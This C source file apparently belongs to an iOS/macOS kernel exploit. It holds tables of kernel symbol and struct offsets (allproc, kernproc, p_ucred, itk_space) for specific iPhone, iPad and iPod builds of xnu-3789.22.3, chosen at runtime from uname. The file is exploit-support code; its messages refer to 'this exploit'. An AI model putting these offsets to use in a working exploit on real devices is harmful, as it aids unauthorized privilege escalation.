#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <sys/utsname.h>

#include "offsets.h"

// offsets from the main kernel 0xfeedfacf
uint64_t allproc_offset;
uint64_t kernproc_offset;

// offsets in struct proc
uint64_t struct_proc_p_pid_offset;
uint64_t struct_proc_task_offset;
uint64_t struct_proc_p_uthlist_offset;
uint64_t struct_proc_p_ucred_offset;
uint64_t struct_proc_p_comm_offset;

// offsets in struct kauth_cred
uint64_t struct_kauth_cred_cr_ref_offset;

// offsets in struct uthread
uint64_t struct_uthread_uu_ucred_offset;
uint64_t struct_uthread_uu_list_offset;

// offsets in struct task
uint64_t struct_task_ref_count_offset;
uint64_t struct_task_itk_space_offset;

// offsets in struct ipc_space
uint64_t struct_ipc_space_is_table_offset;

// offsets in struct ipc_port
uint64_t struct_ipc_port_ip_kobject_offset;

#pragma mark - arm64

void init_arm64() {
	struct_proc_p_pid_offset = 0x10;
	
	struct_proc_task_offset = 0x18;
	struct_proc_p_uthlist_offset = 0x98;
	struct_proc_p_ucred_offset = 0x100;
	struct_proc_p_comm_offset = 0x26c;
	
	struct_kauth_cred_cr_ref_offset = 0x10;
	
	struct_uthread_uu_ucred_offset = 0x168;
	struct_uthread_uu_list_offset = 0x170;
	
	struct_task_ref_count_offset = 0x10;
	struct_task_itk_space_offset = 0x300;
	
	struct_ipc_space_is_table_offset = 0x20;
	
	struct_ipc_port_ip_kobject_offset = 0x68;
}

#pragma mark - macOS

void init_macos_10_12_1() {
	printf("setting offsets for MacOS 10.12.1\n");
	allproc_offset = 0x8bb490;
	kernproc_offset = 0x8BA7D8;
	
	struct_proc_task_offset = 0x18;
	struct_proc_p_uthlist_offset = 0x98;
	struct_proc_p_ucred_offset = 0xe8;
	struct_proc_p_comm_offset = 0x2e4;
	
	struct_kauth_cred_cr_ref_offset = 0x10;
	
	struct_uthread_uu_ucred_offset = 0x168;
	struct_uthread_uu_list_offset = 0x170;
	
	struct_task_ref_count_offset = 0x10;
	struct_task_itk_space_offset = 0x300;
	
	struct_ipc_space_is_table_offset = 0x18;
	
	struct_ipc_port_ip_kobject_offset = 0x68;
}

#pragma mark - iOS

void init_iOS_T7000() {
	allproc_offset = 0x5b4168;
	kernproc_offset = 0x5ba0e0;
}
void init_iOS_T7001() {
	allproc_offset = 0x5b4228;
	kernproc_offset = 0x5ba0e0;
}
void init_iOS_S8000() {
	allproc_offset = 0x5a4148;
	kernproc_offset = 0x5aa0e0;
}
void init_iOS_S8010() {
	allproc_offset = 0x5ec178;
	kernproc_offset = 0x5f20e0;
}
void init_iOS_S5L8960X() {
	allproc_offset = 0x5a4128;
	kernproc_offset = 0x5aa0e0;
}

//here end
void unknown_build() {
	printf("This is an unknown kernel build - the offsets are likely to be incorrect and it's very unlikely this exploit will work\n");
	printf("You need to find these two kernel symbols:\n");
	printf("  allproc\n");
	printf("  kernproc\n\n");
	printf("and update the code\n");
}

#pragma mark - init_offsets

void init_offsets() {
	struct utsname u = { 0 };
	int err = uname(&u);
	if (err == -1) {
		printf("uname failed - what platform is this?\n");
		printf("there's no way this will work, but trying anyway!\n");
		init_iOS_S5L8960X();
		return;
	}
	
	printf("sysname: %s\n", u.sysname);
	printf("nodename: %s\n", u.nodename);
	printf("release: %s\n", u.release);
	printf("version: %s\n", u.version);
	printf("machine: %s\n", u.machine);
	
	init_arm64();
	
	char * model = NULL;
	
#pragma mark - iPhone
	
#pragma mark iPhone6,1
	model = "iPhone6,1";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")) {
			printf("device %s matched\n", model);
			init_iOS_S5L8960X();
			return;
		}
	}
	
#pragma mark iPhone6,2
	model = "iPhone6,2";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")) {
			printf("device %s matched\n", model);
			init_iOS_S5L8960X(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPhone7,1
	model = "iPhone7,1";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7000")) {
			printf("device %s matched\n", model);
			init_iOS_T7000();
			return;
		}
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S8000")) {
			printf("device %s matched\n", model);
			init_iOS_S8000();
			return;
		}
	}
	
#pragma mark iPhone7,2
	model = "iPhone7,2";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7000")) {
			printf("device %s matched\n", model);
			init_iOS_T7000(); // Same offsets.
			return;
		}
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S8000")) {
			printf("device %s matched\n", model);
			init_iOS_S8000(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPhone8,1
	model = "iPhone8,1";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7000")) {
			printf("device %s matched\n", model);
			init_iOS_T7000(); // Same offsets.
			return;
		}
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S8000")) {
			printf("device %s matched\n", model);
			init_iOS_S8000(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPhone8,2
	model = "iPhone8,2";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7000")) {
			printf("device %s matched\n", model);
			init_iOS_T7000(); // Same offsets.
			return;
		}
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S8000")) {
			printf("device %s matched\n", model);
			init_iOS_S8000(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPhone8,4
	model = "iPhone8,4";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S8000")) {
			printf("device %s matched\n", model);
			init_iOS_S8000(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPhone9,1
	model = "iPhone9,1";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T8010")) {
			printf("device %s matched\n", model);
			init_iOS_S8010();
			return;
		}
	}
	
#pragma mark iPhone9,2
	model = "iPhone9,2";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T8010")) {
			printf("device %s matched\n", model);
			init_iOS_S8010(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPhone9,3
	model = "iPhone9,3";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T8010")) {
			printf("device %s matched\n", model);
			init_iOS_S8010(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPhone9,4
	model = "iPhone9,4";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T8010")) {
			printf("device %s matched\n", model);
			init_iOS_S8010(); // Same offsets.
			return;
		}
	}
	
#pragma mark - iPod
	
#pragma mark iPod7,1
	model = "iPod7,1";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7000")) {
			printf("device %s matched\n", model);
			init_iOS_T7000(); // Same offsets.
			return;
		}
	}
	
#pragma mark - iPad
	
#pragma mark iPad4,1
	model = "iPad4,1";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")) {
			printf("device %s matched\n", model);
			init_iOS_S5L8960X(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPad4,2
	model = "iPad4,2";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")) {
			printf("device %s matched\n", model);
			init_iOS_S5L8960X(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPad4,3
	model = "iPad4,3";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")) {
			printf("device %s matched\n", model);
			init_iOS_S5L8960X(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPad4,4
	model = "iPad4,4";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")) {
			printf("device %s matched\n", model);
			init_iOS_S5L8960X(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPad4,5
	model = "iPad4,5";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")) {
			printf("device %s matched\n", model);
			init_iOS_S5L8960X(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPad4,6
	model = "iPad4,6";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")) {
			printf("device %s matched\n", model);
			init_iOS_S5L8960X(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPad4,7
	model = "iPad4,7";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7000")) {
			printf("device %s matched\n", model);
			init_iOS_T7000(); // Same offsets.
			return;
		}
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7001")) {
			printf("device %s matched\n", model);
			init_iOS_T7001();
			return;
		}
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")) {
			printf("device %s matched\n", model);
			init_iOS_S5L8960X(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPad4,8
	model = "iPad4,8";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7000")) {
			printf("device %s matched\n", model);
			init_iOS_T7000(); // Same offsets.
			return;
		}
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7001")) {
			printf("device %s matched\n", model);
			init_iOS_T7001(); // Same offsets.
			return;
		}
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")) {
			printf("device %s matched\n", model);
			init_iOS_S5L8960X(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPad4,9
	model = "iPad4,9";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7000")) {
			printf("device %s matched\n", model);
			init_iOS_T7000(); // Same offsets.
			return;
		}
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7001")) {
			printf("device %s matched\n", model);
			init_iOS_T7001(); // Same offsets.
			return;
		}
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")) {
			printf("device %s matched\n", model);
			init_iOS_S5L8960X(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPad5,1
	model = "iPad5,1";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7000")) {
			printf("device %s matched\n", model);
			init_iOS_T7000(); // Same offsets.
			return;
		}
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7001")) {
			printf("device %s matched\n", model);
			init_iOS_T7001(); // Same offsets.
			return;
		}
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")) {
			printf("device %s matched\n", model);
			init_iOS_S5L8960X(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPad5,2
	model = "iPad5,2";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7000")) {
			printf("device %s matched\n", model);
			init_iOS_T7000(); // Same offsets.
			return;
		}
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7001")) {
			printf("device %s matched\n", model);
			init_iOS_T7001(); // Same offsets.
			return;
		}
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")) {
			printf("device %s matched\n", model);
			init_iOS_S5L8960X(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPad5,3
	model = "iPad5,3";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7000")) {
			printf("device %s matched\n", model);
			init_iOS_T7000(); // Same offsets.
			return;
		}
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7001")) {
			printf("device %s matched\n", model);
			init_iOS_T7001(); // Same offsets.
			return;
		}
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")) {
			printf("device %s matched\n", model);
			init_iOS_S5L8960X(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPad5,4
	model = "iPad5,4";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7000")) {
			printf("device %s matched\n", model);
			init_iOS_T7000(); // Same offsets.
			return;
		}
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_T7001")) {
			printf("device %s matched\n", model);
			init_iOS_T7001(); // Same offsets.
			return;
		}
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S5L8960X")) {
			printf("device %s matched\n", model);
			init_iOS_S5L8960X(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPad6,3
	model = "iPad6,3";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S8000")) {
			printf("device %s matched\n", model);
			init_iOS_S8000(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPad6,4
	model = "iPad6,4";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S8000")) {
			printf("device %s matched\n", model);
			init_iOS_S8000(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPad6,7
	model = "iPad6,7";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S8000")) {
			printf("device %s matched\n", model);
			init_iOS_S8000(); // Same offsets.
			return;
		}
	}
	
#pragma mark iPad6,8
	model = "iPad6,8";
	if (strstr(u.machine, model)) {
		if (strstr(u.version, "root:xnu-3789.22.3~1/RELEASE_ARM64_S8000")) {
			printf("device %s matched\n", model);
			init_iOS_S8000(); // Same offsets.
			return;
		}
	}
	
	printf("don't recognize this platform\n");
	unknown_build();
	init_iOS_S5L8960X(); // this won't work!
}
